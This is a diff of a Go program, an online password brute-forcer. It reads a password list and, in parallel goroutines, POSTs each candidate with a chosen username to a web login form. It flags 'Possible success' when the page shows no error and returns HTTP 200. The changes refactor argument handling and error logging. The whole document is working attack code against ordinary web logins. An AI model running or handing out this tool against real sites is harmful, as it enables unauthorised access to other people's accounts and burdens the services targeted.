@@ -26,48 +26,57 @@ Example:
 `)
 }
 
-func checkArgs() (string, string, string, string, string) {
+func testLoginForm(url, userField, passField, username, password string, doneChannel chan bool) {
+	postData := userField + "=" + username + "&" + passField + "=" + password
+
+	request, err := http.NewRequest("POST", url, bytes.NewBufferString(postData))
+	if err != nil {
+		log.Println(err)
+	}
+
+	client := &http.Client{}
+
+	response, err := client.Do(request)
+	if err != nil {
+		log.Println("error making request. ", err)
+	}
+	defer response.Body.Close()
+
+	body := make([]byte, 5000) // ~5k buffer for page contents
+
+	_, err = response.Body.Read(body)
+	if err != nil {
+		log.Println("error read body. ", err)
+	}
+
+	if bytes.Contains(body, []byte("error")) {
+		log.Println("error found on website.")
+	}
+
+	log.Printf("%s", body)
+
+	if bytes.Contains(body, []byte("Error")) || response.StatusCode != 200 {
+		log.Println("error on page or in response code ", response.StatusCode)
+	} else {
+		log.Println("Possible success with password: ", password)
+	}
+
+	doneChannel <- true
+}
+
+func main() {
 	if len(os.Args) != 6 {
 		log.Println("Incorrect number of arguments.")
 		printUsage()
 		os.Exit(1)
 	}
-	// Password list, Post URL, username, username field,
-	// password field
-	return os.Args[1], os.Args[2], os.Args[3], os.Args[4], os.Args[5]
-}
 
-func testLoginForm(url, userField, passField, username, password string, doneChannel chan bool) {
-	postData := userField + "=" + username + "&" + passField + "=" + password
-	request, err := http.NewRequest("POST", url, bytes.NewBufferString(postData))
-	client := &http.Client{}
-	response, err := client.Do(request)
-	if err != nil {
-		log.Println("Error making request. ", err)
-	}
-	defer response.Body.Close()
-	body := make([]byte, 5000) // ~5k buffer for page contents
-	response.Body.Read(body)
-	if bytes.Contains(body, []byte("ERROR")) {
-		log.Println("Error found on website.")
-	}
-	log.Printf("%s", body)
-	if bytes.Contains(body, []byte("ERROR")) || response.StatusCode != 200 {
-		// Error on page or in response code
-	} else {
-		log.Println("Possible success with password: ", password)
-		// os.Exit(0) // Exit on success?
-	}
-	doneChannel <- true
-}
-
-func main() {
-	pwList, postURL, username, userField, passField := checkArgs()
+	pwList, postURL, username, userField, passField := os.Args[1], os.Args[2], os.Args[3], os.Args[4], os.Args[5]
 
 	// Open password list file
 	passwordFile, err := os.Open(pwList)
 	if err != nil {
-		log.Fatal("Error opening file. ", err)
+		log.Fatal("error opening file. ", err)
 	}
 	defer passwordFile.Close()
 
@@ -80,7 +89,9 @@ func main() {
 	// Check each password against url
 	for scanner.Scan() {
 		numThreads++
+
 		password := scanner.Text()
+
 		go testLoginForm(
 			postURL,
 			userField,
@@ -91,7 +102,7 @@ func main() {
 		)
 
 		// If max threads reached, wait for one to finish before
-		//continuing
+		// continuing
 		if numThreads >= maxThreads {
 			<-doneChannel
 			numThreads--
